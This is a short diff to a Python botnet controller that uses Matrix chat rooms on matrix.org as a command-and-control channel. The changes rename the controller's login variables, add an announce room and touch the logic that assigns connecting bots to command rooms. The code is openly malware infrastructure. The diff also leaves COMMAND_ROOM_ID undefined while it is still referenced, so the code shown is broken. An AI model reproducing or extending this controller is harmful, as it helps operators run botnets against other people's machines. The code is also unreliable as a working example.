@@ -11,10 +11,9 @@ import json
 from dataclasses import dataclass
 
 load_dotenv()
-USER_NAME = os.getenv('USER_NAME')  
-PASSWORD = os.getenv('PASSWORD')
-ROOM_ID = os.getenv('ROOM_ID')
-COMMAND_ROOM_ID = os.getenv('COMMAND_ROOM_ID')
+USER_NAME = os.getenv('CONTROLLER_NAME')  
+PASSWORD = os.getenv('CONTROLLER_PASSWORD')
+ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
 MATRIX_HOMESERVER = "https://matrix.org"
 
 
@@ -92,7 +91,7 @@ class BotnetController:
         return room
             
     def join_rooms(self):
-        self.announce_room = self.join_room(ROOM_ID)
+        self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
         for cmdroom in [COMMAND_ROOM_ID]:
             self.command_rooms[cmdroom] = CommandRoom(self.join_room(cmdroom))
 
@@ -115,6 +114,7 @@ class BotnetController:
         msgbody = msgbody.removeprefix("CONNECT:")
         msgbody = json.loads(msgbody)
         botid = msgbody["bot_id"]
+        # TODO: no room available? -> send RETRY IN: 
         # Uniform distr so should be fine
         room_id = random.choice(list(self.command_rooms.keys()))
         self.announce_room.send_text(
